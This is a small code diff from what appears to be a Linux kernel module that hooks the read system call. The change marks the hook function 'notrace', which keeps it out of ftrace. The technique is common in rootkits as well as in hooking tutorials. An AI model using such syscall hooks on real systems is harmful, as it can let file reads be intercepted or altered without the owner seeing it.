@@ -5,7 +5,7 @@ spinlock_t modified_files_lock = __SPIN_LOCK_UNLOCKED(modified_files_lock);
 
 asmlinkage long (*__orig_read)(const struct pt_regs *) = NULL;
 
-asmlinkage long read_hook(const struct pt_regs *regs) {
+asmlinkage long notrace read_hook(const struct pt_regs *regs) {
     long ret = __orig_read(regs);
     if (ret <= 0)
         return ret;
